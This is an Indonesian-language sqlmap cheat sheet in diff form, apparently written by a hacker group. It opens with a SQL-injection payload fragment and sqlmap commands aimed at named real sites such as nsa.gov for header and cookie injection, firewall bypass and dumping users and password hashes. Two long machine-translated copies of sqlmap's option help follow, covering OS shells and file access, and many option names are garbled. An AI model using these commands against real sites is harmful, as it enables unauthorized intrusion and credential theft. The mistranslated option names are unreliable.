,0x3c74723e3c74643e,table_name,0x3c2f74643e3c74643e,column_name))))x))
+
+#!/usr/bin/sqlmap
+
+Author : Omest
+Thanks to : Hz3666ghost ( Master Sqlmap )
+Shootz : Rebirth Haxor - Indo Ghost Sec
+Greetz : AnonGhost - Milw0rm - TeaMp0isoN
+
+- sql yang di upload di header PUT
+python2 sqlmap.py --method=PUT -u "https://nsa.gov" --headers="referer:*" 
+
+- untuk bypass segala jenis forbidden ( firewall )
+python2 sqlmap.py -u https://dsj9.cc/ --level 5 --dbs --random-agent -v 3
+
+- untuk retrieve informasi
+--users --passwords --privileges --roles --threads=10
+
+- untuk tajuk refferer
+python2 sqlmap.py -u "https://zonaallnet.xyz" --headers="referer:*"
+
+- header injeksi ke kombinasi sql
+python2 sqlmap.py -u "https://zonaallnet.xyz" --headers="x-forwarded-for:127.0.0.1*"
+
+~ injeksi header di metode HTTP
+
+Injections in Headers and other HTTP Methods
+
+#Inside cookie
+sqlmap  -u "http://example.com" --cookie "mycookies=*"
+
+#Inside some header
+sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+sqlmap -u "http://example.com" --headers="referer:*"
+
+#PUT Method
+sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+#The injection is located at the '*'
+• pengaturan / penggunaan sqlmap ( indonesia )
+``
+Penggunaan: python sqlmap.py [opsi]
+
+Pilihan:
+  -h, --help Tampilkan pesan bantuan dasar dan keluar
+  -hh Tampilkan pesan bantuan lanjutan dan keluar
+  --version Tampilkan nomor versi program dan keluar
+  -v VERBOSE Tingkat verbositas: 0-6 (default 1)
+
+  Target:
+    Setidaknya satu dari opsi ini harus disediakan untuk menentukan
+    target
+
+    -u URL, --url = URL Target URL (mis. "http://www.site.com/vuln.php?id=1")
+    -d DIRECT Connection string untuk koneksi database langsung
+    -l LOGFILE Parse target dari file log proxy Burp atau WebScarab
+    -m BULKFILE Memindai beberapa target yang diberikan dalam file tekstual
+    -r REQUESTFILE Memuat permintaan HTTP dari sebuah file
+    -g GOOGLEDORK Memproses hasil Google dork sebagai URL target
+    -c CONFIGFILE Memuat opsi dari file konfigurasi INI
+
+  Permintaan:
+    Opsi ini dapat digunakan untuk menentukan cara menghubungkan ke URL target
+
+    -A AGEN, --pengguna .. Nilai header HTTP User-Agent
+    -H HEADER, --hea .. Header tambahan (mis. "X-Forwarded-For: 127.0.0.1")
+    --method = METHOD Paksa penggunaan metode HTTP yang diberikan (misalnya PUT)
+    --data = DATA Data string yang akan dikirim melalui POST (misalnya "id = 1")
+    --param-del = PARA .. Karakter yang digunakan untuk memisahkan nilai parameter (misalnya &)
+    --cookie = Nilai header Cookie HTTP COOKIE (mis. "PHPSESSID = a8d127e ..")
+    --cookie-del = COO .. Karakter yang digunakan untuk memisahkan nilai cookie (mis;)
+    --live-cookies = L .. File cookie langsung yang digunakan untuk memuat nilai-nilai terkini
+    --load-cookies = L .. File yang berisi cookie dalam format Netscape / wget
+    --drop-set-cookie Abaikan header Set-Cookie dari tanggapan
+    - meniru ponsel pintar melalui HTTP User-Agent header
+    --random-agent Gunakan nilai header HTTP User-Agent yang dipilih secara acak
+    --host = HOST nilai header HTTP Host
+    --referer = REFERER Nilai header HTTP Referer
+    --headers = HEADERS Header tambahan (mis. "Terima-Bahasa: fr \ nETag: 123")
+    --auth-type = AUTH .. Jenis otentikasi HTTP (Basic, Digest, NTLM atau PKI)
+    --auth-cred = AUTH .. Kredensial otentikasi HTTP (nama: kata sandi)
+    --auth-file = AUTH .. otentikasi HTTP sertifikat PEM / file kunci pribadi
+    --ignore-code = IG .. Abaikan (bermasalah) kode kesalahan HTTP (misalnya 401)
+    --ignore-proxy Abaikan pengaturan proxy default sistem
+    --ignore-redirects Abaikan upaya pengalihan
+    --ignore-timeout Abaikan timeout koneksi
+    --proxy = PROXY Gunakan proxy untuk terhubung ke URL target
+    --proxy-cred = PRO .. Kredensial otentikasi proxy (nama: kata sandi)
+    --proxy-file = PRO .. Muat daftar proxy dari sebuah file
+    --proxy-freq = PRO .. Permintaan antara perubahan proxy dari daftar yang diberikan
+    --tor Gunakan jaringan anonimitas Tor
+    --tor-port = TORPORT Atur port proxy Tor selain default
+    --tor-type = TORTYPE Set Tor proxy type (HTTP, SOCKS4 atau SOCKS5 (default))
+    --check-tor Periksa untuk melihat apakah Tor digunakan dengan benar
+    --delay = DELAY Delay dalam hitungan detik antara setiap permintaan HTTP
+    --timeout = TIMEOUT Detik menunggu sebelum koneksi timeout (default 30)
+    --retries = RETRIES Retries ketika koneksi timeout (default 3)
+    --randomize = RPARAM Ubah nilai secara acak untuk parameter yang diberikan
+    --safe-url = SAFEURL alamat URL yang sering dikunjungi selama pengujian
+    --safe-post = AMAN .. POST data untuk dikirim ke URL yang aman
+    --safe-req = AMAN .. Muat permintaan HTTP yang aman dari sebuah file
+    --safe-freq = SAFE .. Permintaan reguler di antara kunjungan ke URL yang aman
+    --skip-urlencode Lewati pengkodean URL dari data payload
+    --csrf-token = CSR .. Parameter yang digunakan untuk menyimpan token anti-CSRF
+    --csrf-url = CSRFURL alamat URL yang dikunjungi untuk ekstraksi token anti-CSRF
+    --csrf-method = CS .. Metode HTTP yang akan digunakan selama kunjungan halaman token anti-CSRF
+   --csrf-retries = C .. Percobaan ulang untuk pengambilan token anti-CSRF (default 0)
+    --force-ssl Paksa penggunaan SSL / HTTPS
+    --chunked Gunakan permintaan HTTP chunked transfer encoded (POST)
+    --hpp Gunakan metode polusi parameter HTTP
+    --eval = EVALCODE Evaluasi kode Python yang disediakan sebelum permintaan (mis
+                        "import hashlib; id2 = hashlib.md5 (id) .hexdigest ()")
+
+  Optimasi:
+    Opsi ini dapat digunakan untuk mengoptimalkan kinerja sqlmap
+
+    -o Nyalakan semua sakelar pengoptimalan
+    --predict-output Memprediksi keluaran kueri umum
+    --keep-living Gunakan koneksi HTTP (s) yang persisten
+    --null-connection Mengambil panjang halaman tanpa isi respons HTTP yang sebenarnya
+    --threads = THREADS Jumlah maksimum permintaan HTTP bersamaan (default 1)
+
+  Injeksi:
+    Opsi ini dapat digunakan untuk menentukan parameter mana yang akan diuji,
+    menyediakan muatan injeksi khusus dan skrip gangguan opsional
+
+    -p TESTPARAMETER Parameter yang dapat diuji
+    --skip = SKIP Lewati pengujian untuk parameter tertentu
+    --skip-static Lewati parameter pengujian yang tampaknya tidak dinamis
+    --param-exclude = .. Regexp untuk mengecualikan parameter dari pengujian (mis. "ses")
+    --param-filter = P .. Pilih parameter yang dapat diuji berdasarkan tempat (mis. "POST")
+    --dbms = DBMS Paksa DBMS back-end ke nilai yang diberikan
+    --dbms-cred = DBMS .. Kredensial otentikasi DBMS (pengguna: kata sandi)
+    --os = OS Paksa sistem operasi DBMS back-end ke nilai yang diberikan
+    --invalid-bignum Gunakan angka besar untuk membuat nilai tidak valid
+    --invalid-logical Gunakan operasi logika untuk membuat nilai tidak valid
+    --invalid-string Gunakan string acak untuk membuat nilai tidak valid
+    --no-cast Matikan mekanisme pengecoran muatan
+    --no-escape Matikan mekanisme string escaping
+    --prefix = PREFIX Injeksi payload awalan string
+    --suffix = SUFFIX Injection payload suffix string
+    --tamper = TAMPER Gunakan skrip yang diberikan untuk merusak data injeksi
+
+  Deteksi:
+    Opsi ini dapat digunakan untuk menyesuaikan fase deteksi
+
+    --level = LEVEL Tingkat pengujian yang akan dilakukan (1-5, default 1)
+    --risk = RISIKO Risiko pengujian yang akan dilakukan (1-3, default 1)
+    --string = STRING String untuk dicocokkan saat kueri dievaluasi ke True
+    --not-string = NOT .. String yang akan dicocokkan saat kueri dievaluasi ke False
+    --regexp = REGEXP Regexp agar cocok saat query dievaluasi ke True
+    --code = CODE kode HTTP untuk dicocokkan saat kueri dievaluasi ke True
+    --smart Lakukan tes menyeluruh hanya jika heuristik positif
+    --text-only Bandingkan halaman hanya berdasarkan konten tekstual
+    --titles Bandingkan halaman hanya berdasarkan judulnya
+
+  Teknik:
+    Opsi ini dapat digunakan untuk mengubah pengujian injeksi SQL tertentu
+    teknik
+
+    --technique = TECH .. Teknik injeksi SQL yang akan digunakan (default "BEUSTQ")
+    --time-sec = TIMESEC Detik untuk menunda respon DBMS (default 5)
+    --union-cols = UCOLS Rentang kolom untuk menguji injeksi SQL kueri UNION
+    --union-char = UCHAR Karakter yang digunakan untuk bruteforcing jumlah kolom
+    --union-from = UFROM Tabel untuk digunakan di FROM bagian dari injeksi SQL kueri UNION
+    --dns-domain = DNS .. Nama domain yang digunakan untuk serangan eksfiltrasi DNS
+    --second-url = SEC .. URL halaman yang dihasilkan mencari respon urutan kedua
+    --second-req = SEC .. Muat permintaan HTTP urutan kedua dari file
+
+  Sidik jari:
+    -f, --fingerprint Lakukan sidik jari versi DBMS yang ekstensif
+
+  Pencacahan:
+    Opsi ini dapat digunakan untuk menghitung database back-end
+    informasi sistem manajemen, struktur dan data yang terdapat di dalam
+    tabel
+
+    -a, --semua Ambil semuanya
+    -b, --banner Ambil spanduk DBMS
+    --current-user Ambil DBMS pengguna saat ini
+    --current-db Mengambil database DBMS saat ini
+    --hostname Ambil nama host server DBMS
+    --is-dba Mendeteksi jika pengguna DBMS saat ini adalah DBA
+    --pengguna Menghitung pengguna DBMS
+    --passwords Menghitung hash kata sandi pengguna DBMS
+    --privileges Menghitung hak istimewa pengguna DBMS
+    --roles Menghitung peran pengguna DBMS
+    --dbs Menghitung database DBMS
+    --tables Menghitung tabel database DBMS
+    --columns Menghitung kolom tabel database DBMS
+    --schema Menghitung skema DBMS
+    --count Ambil jumlah entri untuk tabel
+    --dump Dump entri tabel database DBMS
+    --dump-all Buang semua entri tabel database DBMS
+    --search Pencarian kolom, tabel dan / atau nama database
+    --comments Periksa komentar DBMS selama pencacahan
+    --statements Mengambil pernyataan SQL yang dijalankan di DBMS
+    -D DB DBMS database untuk menghitung
+    -T TBL tabel database DBMS untuk menghitung
+    -C COL kolom tabel database DBMS untuk menghitung
+    -X KECUALIKAN ID database DBMS untuk tidak menghitung
+    -U PENGGUNA DBMS pengguna untuk menghitung
+    --exclude-sysdbs Kecualikan database sistem DBMS saat menghitung tabel
+    --pivot-column = P .. Nama kolom pivot
+    --where = DUMPWHERE Gunakan kondisi WHERE saat table dumping
+    --start = LIMITSTART Entri tabel dump pertama yang diambil
+    --stop = LIMITSTOP Entri tabel dump terakhir untuk diambil
+    --first = FIRSTCHAR Karakter kata keluaran kueri pertama yang diambil
+    --last = LASTCHAR Karakter kata keluaran kueri terakhir yang akan diambil
+    --sql-query = SQLQ .. Pernyataan SQL yang akan dijalankan
+    --sql-shell Prompt untuk shell SQL interaktif
+    --sql-file = SQLFILE Jalankan pernyataan SQL dari file yang diberikan
+
+  Kasar:
+  Opsi ini dapat digunakan untuk mengakses manajemen database back-end
+    sistem operasi yang mendasari sistem
+
+    --os-cmd = OSCMD Jalankan perintah sistem operasi
+    --os-shell Prompt untuk shell sistem operasi interaktif
+    --os-pwn Minta shell OOB, Meterpreter, atau VNC
+    --os-smbrelay Perintah satu klik untuk shell OOB, Meterpreter atau VNC
+    --os-bof Stored procedure buffer overflow exploitation
+    --priv-esc Proses database eskalasi hak istimewa pengguna
+    --msf-path = MSFPATH Jalur lokal tempat Metasploit Framework diinstal
+    --tmp-path = TMPPATH Jalur absolut jarak jauh dari direktori file sementara
+
+  Akses registri Windows:
+    Opsi ini dapat digunakan untuk mengakses manajemen database back-end
+    sistem registri Windows
+
+    --reg-read Membaca nilai kunci registri Windows
+    --reg-add Menulis data nilai kunci registri Windows
+    --reg-del Menghapus nilai kunci registri Windows
+    --reg-key = REGKEY kunci registri Windows
+    --reg-value = REGVAL Nilai kunci registri Windows
+    --reg-data = REGDATA Data nilai kunci registri Windows
+    --reg-type = REGTYPE Jenis nilai kunci registri Windows
+
+  Umum:
+    Opsi ini dapat digunakan untuk mengatur beberapa parameter kerja umum
+
+    -s SESSIONFILE Memuat sesi dari file (.sqlite) yang disimpan
+    -t TRAFFICFILE Log semua lalu lintas HTTP ke dalam file tekstual
+    --answers = JAWABAN Tetapkan jawaban yang telah ditentukan sebelumnya (misalnya "berhenti = N, ikuti = N")
+    --base64 = BASE64P .. Parameter yang berisi data yang dikodekan Base64
+    --base64-safe Gunakan URL dan nama file alfabet Base64 yang aman (RFC 4648)
+    --batch Jangan pernah meminta input pengguna, gunakan perilaku default
+    --binary-fields = .. Field hasil yang memiliki nilai biner (misalnya "intisari")
+    --check-internet Periksa koneksi internet sebelum menilai target
+    --cleanup Bersihkan DBMS dari UDF dan tabel khusus sqlmap
+    --crawl = CRAWLDEPTH Merayapi situs web mulai dari URL target
+    --crawl-exclude = .. Regexp untuk mengecualikan halaman agar tidak dirayapi (mis. "logout")
+    --csv-del = CSVDEL Karakter pembatas yang digunakan dalam keluaran CSV (default ",")
+    --charset = CHARSET Blind SQL injection charset (misalnya "0123456789abcdef")
+    --dump-format = DU .. Format data yang dibuang (CSV (default), HTML atau SQLITE)
+    --encoding = ENCOD .. Pengkodean karakter digunakan untuk pengambilan data (mis. GBK)
+    --eta Menampilkan untuk setiap keluaran perkiraan waktu kedatangan
+    --file sesi Flush sesi untuk target saat ini
+    --forms Mengurai dan menguji formulir pada URL target
+    --fresh-queries Abaikan hasil query yang disimpan dalam file sesi
+    --gpage = GOOGLEPAGE Gunakan hasil Google dork dari nomor halaman yang ditentukan
+    --har = HARFILE Mencatat semua lalu lintas HTTP ke dalam file HAR
+    --hex Gunakan konversi hex selama pengambilan data
+    --output-dir = OUT .. Jalur direktori keluaran khusus
+    --parse-error Mengurai dan menampilkan pesan error DBMS dari tanggapan
+    --preprocess = PRA .. Gunakan skrip yang diberikan untuk preprocessing (permintaan)
+    --postprocess = PO .. Gunakan script yang diberikan untuk postprocessing (respon)
+    - perbaiki entri Redump yang memiliki penanda karakter yang tidak diketahui (?)
+    --save = SAVECONFIG Menyimpan opsi ke file konfigurasi INI
+    --scope = SCOPE Regexp untuk memfilter target
+    --skip-heuristics Lewati deteksi heuristik dari kerentanan SQLi / XSS
+    --skip-waf Lewati deteksi heuristik dari perlindungan WAF / IPS
+    --table-prefix = T .. Prefix yang digunakan untuk tabel sementara (default: "sqlmap")
+    --test-filter = TE .. Pilih tes berdasarkan muatan dan / atau judul (mis. ROW)
+    --test-skip = TEST .. Lewati tes berdasarkan muatan dan / atau judul (mis. BENCHMARK)
+    --web-root = WEBROOT Direktori root dokumen server web (misalnya "/ var / www")
+
+  Miscellaneous:
+    Opsi ini tidak cocok dengan kategori lain mana pun
+
+    -z MNEMONICS Gunakan mnemonik singkat (mis. "flu, bat, ban, tec = EU")
+    --alert = ALERT Jalankan perintah OS host saat injeksi SQL ditemukan
+    - bip Bip pada pertanyaan dan / atau ketika SQLi / XSS / FI ditemukan
+    --dependencies Periksa dependensi sqlmap yang hilang (opsional)
+    --disable-coloring Nonaktifkan pewarnaan keluaran konsol
+    --list-tampers Menampilkan daftar skrip gangguan yang tersedia
+    --offline Bekerja dalam mode offline (hanya menggunakan data sesi)
+    --purge Hapus semua konten dengan aman dari direktori data sqlmap
+    --results-file = R .. Lokasi file hasil CSV dalam mode beberapa target
+    --shell Prompt untuk shell sqlmap interaktif
+    --tmp-dir = TMPDIR Direktori lokal untuk menyimpan file sementara
+    - Opsi Sesuaikan tidak stabil untuk koneksi yang tidak stabil
+    --update Perbarui sqlmap
+    --wizard Antarmuka penyihir sederhana untuk pengguna pemula
+``
+
+## Output verbositas
+
++ penggunaan / pengaturan ke dua ( tambahan )
+
+-h , --bantuan
+Tampilkan pesan bantuan dasar dan keluar
+-hh
+Tampilkan pesan bantuan lanjutan dan keluar
+--Versi: kapan
+Tampilkan nomor versi program dan keluar
+-v VERBOSE
+Tingkat verbositas: 0-6 (default 1)
+Target:
+Setidaknya satu dari opsi ini harus disediakan untuk menentukan target
+-d LANGSUNG
+String koneksi untuk koneksi database langsung
+-u URL, --url = ,URL/
+URL target (mis. " http://www.site.com/vuln.php?id=1 ")
+-l LOGFILE
+Parsing target dari file log proxy Burp atau WebScarab
+-x SITEMAPURL
+Parsing target dari file peta situs (.xml) jarak jauh
+-m FILE BULK
+Pindai beberapa target yang diberikan dalam file tekstual
+-r REQUESTFILE
+Muat permintaan HTTP dari file
+-g GOOGLEDORK
+Memproses hasil Google dork sebagai URL target
+-c CONFIGFILE
+Muat opsi dari file konfigurasi INI
+Permintaan:
+Opsi ini dapat digunakan untuk menentukan cara terhubung ke URL target
+--metode = ,METODE/
+Paksa penggunaan metode HTTP yang diberikan (misalnya PUT)
+--data = ,DATA/
+String data yang akan dikirim melalui POST
+--param-del = ,PARA/ ..
+Karakter yang digunakan untuk memisahkan nilai parameter
+--kue = , KUKI /
+Nilai header Cookie HTTP
+--cookie-del = ,COO/ ..
+Karakter yang digunakan untuk membagi nilai cookie
+--load-cookies = ,L/ ..
+File yang berisi cookie dalam format Netscape/wget
+--drop-set-cookie
+Abaikan header Set-Cookie dari respons
+--agen-pengguna = ,AGEN/
+Nilai header Agen-Pengguna HTTP
+--random-agent
+Gunakan nilai header Agen-Pengguna HTTP yang dipilih secara acak
+--host = ,HOST/
+Nilai header Host HTTP
+--referer = ,REFERER/
+Nilai header Referer HTTP
+-H HEADER, --hea ..
+Header tambahan (misalnya "X-Forwarded-For: 127.0.0.1")
+--header = ,HEADERS/
+Header tambahan (mis. "Bahasa Terima: fr\nETag: 123")
+--auth-type = ,AUTH/ ..
+Jenis otentikasi HTTP (Basic, Digest, NTLM atau PKI)
+--auth-cred = ,AUTH/ ..
+Kredensial otentikasi HTTP (nama: kata sandi)
+--auth-file = ,AUTH/ ..
+Otentikasi HTTP file PEM cert/private key
+--abaikan-401
+Abaikan Kesalahan HTTP 401 (Tidak Sah)
+--proksi = , PROKSI /
+Gunakan proxy untuk terhubung ke URL target
+--proxy-cred = ,PRO/ ..
+Kredensial otentikasi proxy (nama: kata sandi)
+--proxy-file = ,PRO/ ..
+Muat daftar proxy dari file
+--abaikan-proksi
+Abaikan pengaturan proxy default sistem
+--tor
+Gunakan jaringan anonimitas Tor
+--tor-port = ,TORPORT/
+Setel port proxy Tor selain default
+--tor-type = ,TORTYPE/
+Setel jenis proxy Tor (HTTP (default), SOCKS4 atau SOCKS5)
+--check-tor
+Periksa untuk melihat apakah Tor digunakan dengan benar
+--delay = ,DELAY/
+Penundaan dalam hitungan detik antara setiap permintaan HTTP
+--waktu habis = ,batas waktu/
+Detik untuk menunggu sebelum koneksi timeout (default 30)
+--coba lagi = ,COBA LAGI/
+Mencoba lagi saat waktu koneksi habis (default 3)
+--randomize = ,RPARAM/
+Ubah nilai secara acak untuk parameter yang diberikan
+--safe-url = ,SAFEURL/
+Alamat URL yang sering dikunjungi selama pengujian
+--safe-post = ,AMAN/ ..
+POST data untuk dikirim ke URL yang aman
+--safe-req = ,SAFER/ ..
+Muat permintaan HTTP aman dari file
+--safe-freq = ,AMAN/ ..
+Permintaan uji antara dua kunjungan ke URL aman yang diberikan
+--skip-urlencode
+Lewati penyandian URL dari data muatan
+--csrf-token = ,CSR/ ..
+Parameter yang digunakan untuk menyimpan token anti CSRF
+--csrf-url = ,CSRFURL/
+Alamat URL untuk dikunjungi untuk mengekstrak token anti CSRF
+--force-ssl
+Paksa penggunaan SSL/HTTPS
+--hpp
+Gunakan metode polusi parameter HTTP
+--eval = ,EVALCODE/
+Evaluasi kode Python yang diberikan sebelum permintaan (misalnya "import hashlib;id2=hashlib.md5(id).hexdigest()")
+Pengoptimalan:
+Opsi ini dapat digunakan untuk mengoptimalkan kinerja sqlmap
+-Hai
+Nyalakan semua sakelar pengoptimalan
+--predict-output
+Prediksi keluaran kueri umum
+--berusaha agar hidup
+Gunakan koneksi HTTP yang persisten
+--null-koneksi
+Ambil panjang halaman tanpa isi respons HTTP yang sebenarnya
+--benang = ,BENANG/
+Jumlah maksimum permintaan HTTP bersamaan (default 1)
+Injeksi:
+Opsi ini dapat digunakan untuk menentukan parameter mana yang akan diuji, menyediakan muatan injeksi khusus, dan skrip gangguan opsional
+-p PARAMETER PENGUJIAN
+Parameter yang dapat diuji
+--skip = ,SKIP/
+Lewati pengujian untuk parameter yang diberikan
+--skip-statis
+Lewati parameter pengujian yang tidak tampak dinamis
+--dbms = ,DBMS/
+Paksa DBMS back-end ke nilai ini
+--dbms-cred = ,DBMS/ ..
+Kredensial otentikasi DBMS (pengguna: kata sandi)
+--os = ,OS/
+Paksa sistem operasi DBMS back-end ke nilai ini
+--invalid-bignum
+Gunakan angka besar untuk membatalkan nilai
+--tidak valid-logis
+Gunakan operasi logika untuk membatalkan nilai
+--string-tidak valid
+Gunakan string acak untuk membatalkan nilai
+--tanpa pemeran
+Matikan mekanisme casting payload
+--tidak ada jalan keluar
+Matikan mekanisme pelepasan string
+--awalan = ,PREFIX/
+String awalan muatan injeksi
+--akhiran = , SUFFIX /
+String akhiran muatan injeksi
+--tamper = ,TAMPER/
+Gunakan skrip yang diberikan untuk merusak data injeksi
+Deteksi:
+Opsi ini dapat digunakan untuk menyesuaikan fase deteksi
+--tingkat = ,TINGKAT/
+Tingkat pengujian yang harus dilakukan (1-5, default 1)
+--risiko = ,risiko/
+Risiko pengujian untuk dilakukan (1-3, default 1)
+--string = ,STRING/
+String untuk dicocokkan saat kueri dievaluasi ke True
+--not-string = ,TIDAK/ ..
+String untuk dicocokkan saat kueri dievaluasi ke False
+--regexp = ,REGEXP/
+Regexp untuk dicocokkan ketika kueri dievaluasi ke True
+--kode = ,KODE/
+Kode HTTP untuk dicocokkan saat kueri dievaluasi ke True
+--hanya teks
+Bandingkan halaman hanya berdasarkan konten tekstual
+--judul
+Bandingkan halaman hanya berdasarkan judulnya
+Teknik:
+Opsi ini dapat digunakan untuk mengubah pengujian teknik injeksi SQL tertentu
+--teknik = ,TECH/
+Teknik injeksi SQL untuk digunakan (default "BEUSTQ")
+--waktu-detik = ,TIMESEC/
+Detik untuk menunda respons DBMS (default 5)
+--union-cols = ,UCOLS/
+Rentang kolom untuk menguji injeksi SQL kueri UNION
+--union-char = ,UCHAR/
+Karakter yang digunakan untuk memaksa jumlah kolom
+--union-dari = ,UFROM/
+Tabel untuk digunakan di bagian DARI UNION query SQL injection
+--dns-domain = ,DNS/ ..
+Nama domain yang digunakan untuk serangan eksfiltrasi DNS
+--orde kedua = ,S/ ..
+URL halaman yang dihasilkan dicari untuk respons orde kedua
+Sidik jari:
+-f , --sidik jari
+Lakukan sidik jari versi DBMS yang ekstensif
+Pencacahan:
+Pilihan ini dapat digunakan untuk menghitung informasi sistem manajemen database back-end, struktur dan data yang terkandung dalam tabel. Selain itu Anda dapat menjalankan pernyataan SQL Anda sendiri
+-a , --semua
+Ambil semuanya
+-b , --banner
+Ambil spanduk DBMS
+--pengguna-saat ini
+Ambil DBMS pengguna saat ini
+--saat-db
+Ambil database DBMS saat ini
+--nama host
+Ambil nama host server DBMS
+--is-dba
+Deteksi jika pengguna DBMS saat ini adalah DBA
+--pengguna
+Menghitung pengguna DBMS
+--kata sandi
+Menghitung hash kata sandi pengguna DBMS
+--hak istimewa
+Menghitung hak pengguna DBMS
+--peran
+Menghitung peran pengguna DBMS
+--dbs
+Menghitung database DBMS
+--tabel
+Menghitung tabel database DBMS
+--kolom
+Hitung kolom tabel database DBMSMS
+--skema
+Menghitung skema DBMS
+--menghitung
+Ambil jumlah entri untuk tabel
+--membuang
+Buang entri tabel database DBMS
+--dump-all
+Buang semua entri tabel database DBMS
+--Cari
+Cari kolom, tabel dan/atau nama database
+--komentar
+Ambil komentar DBMS
+-D DB
+Database DBMS untuk dihitung
+-T TBL
+Tabel database DBMS untuk dihitung
+-C COL
+Kolom tabel database DBMS untuk dihitung
+-X EXCLUDECOL
+Kolom tabel database DBMS untuk tidak dihitung
+-U PENGGUNA
+Pengguna DBMS untuk menghitung
+--kecuali-sysdbs
+Kecualikan database sistem DBMS saat menghitung tabel
+--mana = ,DUMPWHERE/
+Gunakan kondisi WHERE saat membuang tabel
+--mulai = ,LIMITSTART/
+Entri keluaran kueri pertama yang diambil
+--stop = ,LIMITSTOP/
+Entri keluaran kueri terakhir untuk diambil
+--pertama = ,FIRSTCHAR/
+Karakter kata keluaran kueri pertama yang diambil
+--terakhir = ,LASTCHAR/
+Karakter kata keluaran kueri terakhir untuk diambil
+--sql-query = ,QUERY/
+Pernyataan SQL yang akan dieksekusi
+--sql-shell
+Prompt untuk shell SQL interaktif
+--sql-file = ,SQLFILE/
+Jalankan pernyataan SQL dari file yang diberikan
+Paksaan:
+Opsi ini dapat digunakan untuk menjalankan pemeriksaan brute force
+--common-tabel
+Periksa keberadaan tabel umum
+--kolom-umum
+Periksa keberadaan kolom umum
+Injeksi fungsi yang ditentukan pengguna:
+Opsi ini dapat digunakan untuk membuat fungsi yang ditentukan pengguna khusus
+--udf-inject
+Suntikkan fungsi yang ditentukan pengguna khusus
+--shared-lib = ,SHLIB/
+Jalur lokal perpustakaan bersama
+Akses sistem file:
+Opsi ini dapat digunakan untuk mengakses sistem manajemen basis data back-end yang mendasari sistem file
+--file-baca = ,RFILE/
+Baca file dari sistem file DBMS back-end
+--file-tulis = ,WFILE/
+Tulis file lokal pada sistem file DBMS back-end
+--file-dest = ,DFILE/
+Jalur file absolut DBMS back-end untuk menulis
+Akses sistem operasi:
+Opsi ini dapat digunakan untuk mengakses sistem manajemen basis data back-end yang mendasari sistem operasi
+--os-cmd = ,OSCMD/
+Jalankan perintah sistem operasi
+--os-shell
+Prompt untuk shell sistem operasi interaktif
+--os-pwn
+Prompt untuk shell OOB, Meterpreter atau VNC
+--os-smbrelay
+Satu klik prompt untuk shell OOB, Meterpreter atau VNC
+--os-bof
+Eksploitasi buffer overflow prosedur tersimpan
+--priv-esc
+Eskalasi hak pengguna proses basis data
+--msf-path = ,MSFPATH/
+Jalur lokal tempat Metasploit Framework diinstal
+--tmp-path = ,TMPPATH/
+Jalur absolut jarak jauh dari direktori file sementara
+Akses registri Windows:
+Opsi ini dapat digunakan untuk mengakses sistem manajemen basis data back-end registri Windows
+--reg-baca
+Baca nilai kunci registri Windows
+--reg-tambahkan
+Tulis data nilai kunci registri Windows
+--reg-del
+Hapus nilai kunci registri Windows
+--reg-key = ,REGKEY/
+Kunci registri Windows
+--reg-nilai = ,REGVAL/
+Nilai kunci registri Windows
+--reg-data = ,REGDATA/
+Data nilai kunci registri Windows
+--reg-type = ,REGTYPE/
+Jenis nilai kunci registri Windows
+Umum:
+Opsi ini dapat digunakan untuk mengatur beberapa parameter kerja umum
+-s SESI FILE
+Muat sesi dari file (.sqlite) yang tersimpan
+-t TRAFFICFILE
+Log semua lalu lintas HTTP ke dalam file tekstual
+--batch
+Jangan pernah meminta masukan pengguna, gunakan perilaku default
+--charset = ,CHARSET/
+Paksa pengkodean karakter yang digunakan untuk pengambilan data
+--crawl = ,JALAN PERANGKAT/
+Merangkak situs web mulai dari URL target
+--crawl-exclude= ..
+Regexp untuk mengecualikan halaman dari crawling (mis. "logout")
+--csv-del = ,CSVDEL/
+Membatasi karakter yang digunakan dalam output CSV (default ",")
+--dump-format = ,DU/ ..
+Format data yang dibuang (CSV (default), HTML atau SQLITE)
+--eta
+Tampilkan untuk setiap keluaran perkiraan waktu kedatangan
+--siram-sesi
+Siram file sesi untuk target saat ini
+--formulir
+Parsing dan uji formulir pada URL target
+--fresh-queries
+Abaikan hasil kueri yang disimpan dalam file sesi
+--hex
+Gunakan fungsi hex DBMS untuk pengambilan data
+--output-dir = ,OUT/ ..
+Jalur direktori keluaran khusus
+--parse-error
+Parsing dan tampilkan pesan kesalahan DBMS dari tanggapan
+--pivot-column = ,P/ ..
+Nama kolom pivot
+--simpan = ,SAVECONFIG/
+Simpan opsi ke file konfigurasi INI
+--lingkup = ,LINGKUP/
+Regexp untuk memfilter target dari log proxy yang disediakan
+--test-filter = ,TE/ ..
+Pilih tes berdasarkan muatan dan/atau judul (misalnya ROW)
+--test-skip = ,TEST/ ..
+Lewati tes berdasarkan muatan dan/atau judul (misalnya BENCHMARK)
+--memperbarui
+Perbarui sqlmap
+Lain-lain:
+-z MNEMONIK
+Gunakan mnemonik singkat (misalnya "flu,kelelawar,ban,tec=EU")
+--peringatan = , PERINGATAN /
+Jalankan perintah OS host ketika injeksi SQL ditemukan
+--jawaban = ,JAWABAN/
+Tetapkan jawaban pertanyaan (misalnya "keluar=N,ikuti=N")
+--berbunyi
+Bip pada pertanyaan dan/atau ketika injeksi SQL ditemukan
+--membersihkan
+Bersihkan DBMS dari UDF dan tabel khusus sqlmap
+--dependensi
+Periksa dependensi sqlmap (non-inti) yang hilang
+--nonaktifkan-pewarnaan
+Nonaktifkan pewarnaan keluaran konsol
+--gpage = ,GOOGLEPAGE/
+Gunakan hasil Google dork dari nomor halaman yang ditentukan
+--identify-waf
+Lakukan pengujian menyeluruh untuk perlindungan WAF/IPS/IDS
+--skip-waf
+Lewati deteksi heuristik perlindungan WAF/IPS/IDS
+--mobile
+Tiru smartphone melalui HTTP User-Agent header
+--offline
+Bekerja dalam mode offline (hanya menggunakan data sesi)
+--Peringkat halaman
+Tampilkan peringkat halaman (PR) untuk hasil Google dork
+--pembersih-keluaran
+Hapus semua konten dengan aman dari direktori keluaran
+--pintar
+Lakukan tes menyeluruh hanya jika heuristik positif
+--sqlmap-shell
+Prompt untuk shell sqlmap interaktif
+--Penyihir
+Antarmuka wizard sederhana untuk pengguna pemula
+
+
+~ kumpulan perintah tamper dan bisa membypass firewall juga
+
+# All scripts
+```
